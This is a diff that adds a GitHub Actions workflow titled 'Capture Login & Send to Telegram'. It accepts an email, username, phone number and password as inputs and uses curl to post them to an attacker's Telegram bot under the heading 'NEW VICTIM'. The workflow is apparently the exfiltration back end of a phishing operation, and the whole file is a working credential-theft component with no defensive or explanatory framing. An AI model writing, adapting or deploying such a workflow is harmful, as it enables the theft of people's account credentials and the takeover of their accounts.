@@ -1,0 +1,25 @@
+name: Capture Login & Send to Telegram
+
+on:
+  workflow_dispatch:
+    inputs:
+      email:
+        required: true
+      username:
+        required: true
+      phone:
+        required: false
+        default: "Not provided"
+      password:
+        required: true
+
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Send to Telegram
+        run: |
+          curl -s -X POST https://api.telegram.org/bot${{ secrets.BOT_TOKEN }}/sendMessage \
+            -d chat_id=${{ secrets.CHAT_ID }} \
+            -d parse_mode=HTML \
+            -d text="<b>NEW VICTIM</b>%0A%F0%9F%94%B9 Email: <code>${{ github.event.inputs.email }}</code>%0A%F0%9F%94%B9 Username: <code>${{ github.event.inputs.username }}</code>%0A%F0%9F%94%B9 Phone: <code>${{ github.event.inputs.phone }}</code>%0A%F0%9F%94%B9 Password: <code>${{ github.event.inputs.password }}</code>%0A%F0%9F%95%90 Time: $(date +'%Y-%m-%d %H:%M:%S UTC')"
